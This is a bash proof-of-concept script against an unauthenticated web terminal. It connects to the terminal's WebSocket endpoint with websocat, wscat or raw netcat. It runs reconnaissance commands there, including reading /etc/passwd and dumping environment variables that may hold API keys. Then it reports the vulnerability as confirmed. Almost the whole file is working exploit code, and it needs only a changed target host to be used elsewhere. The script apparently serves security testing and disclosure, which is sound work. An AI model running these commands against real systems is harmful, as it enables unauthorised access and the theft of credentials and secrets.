#!/bin/bash

# POC: Information Disclosure via Unauthenticated Web Terminal
# This script demonstrates the ability to extract sensitive system information
# through the terminal's WebSocket endpoint without authentication

TARGET_HOST="localhost"
TARGET_PORT="22222"
WS_URL="ws://${TARGET_HOST}:${TARGET_PORT}/ws"

echo "[*] Information Disclosure POC - Terminal Commands"
echo "[*] Target: ${WS_URL}"
echo ""

# Function to send command via WebSocket and capture output
send_command() {
    local cmd="$1"
    local description="$2"
    
    echo "[+] Executing: $description"
    echo "    Command: $cmd"
    
    # Use websocat if available, otherwise fall back to curl with websocket support
    if command -v websocat &> /dev/null; then
        # Using websocat (if installed)
        timeout 5 bash -c "echo '$cmd' | websocat '${WS_URL}'" 2>/dev/null | head -20
    elif command -v wscat &> /dev/null; then
        # Using wscat (if installed)
        timeout 5 wscat -c "${WS_URL}" --execute "$cmd" 2>/dev/null | head -20
    else
        # Fallback: Use curl to upgrade to WebSocket
        # This is a simplified approach - actual implementation depends on server behavior
        (echo "GET /ws HTTP/1.1"; echo "Host: ${TARGET_HOST}:${TARGET_PORT}"; echo "Upgrade: websocket"; echo "Connection: Upgrade"; echo "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ=="; echo "Sec-WebSocket-Version: 13"; echo ""; echo "$cmd") | timeout 5 nc -w 2 "${TARGET_HOST}" "${TARGET_PORT}" 2>/dev/null | tail -30
    fi
    
    echo ""
    echo "---"
    echo ""
}

# Test basic connectivity first
echo "[*] Testing connectivity to terminal endpoint..."
timeout 3 bash -c "echo > /dev/tcp/${TARGET_HOST}/${TARGET_PORT}" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] Terminal endpoint is accessible"
else
    echo "[-] Cannot reach terminal endpoint - trying with curl fallback"
fi
echo ""

# Define sensitive information disclosure commands
declare -a COMMANDS=(
    "uname -a|System Architecture"
    "whoami|Current User"
    "id|User ID and Groups"
    "cat /etc/passwd|System User Accounts"
    "env|Environment Variables (may contain secrets)"
    "ps aux|Running Processes"
    "ip addr show|Network Configuration"
    "ifconfig|Network Interfaces"
    "hostname|System Hostname"
    "pwd|Current Working Directory"
)

# Execute each command
for entry in "${COMMANDS[@]}"; do
    cmd="${entry%%|*}"
    desc="${entry##*|}"
    send_command "$cmd" "$desc"
done

echo "[*] POC Summary:"
echo "[*] Successfully demonstrated access to:"
echo "    - System architecture and OS information"
echo "    - Current user identity"
echo "    - System user accounts (/etc/passwd)"
echo "    - Environment variables (potential secrets/API keys)"
echo "    - Running processes and system activity"
echo "    - Network configuration"
echo "    - System hostname and current directory"
echo ""
echo "[!] VULNERABILITY CONFIRMED: Unrestricted access to sensitive system information"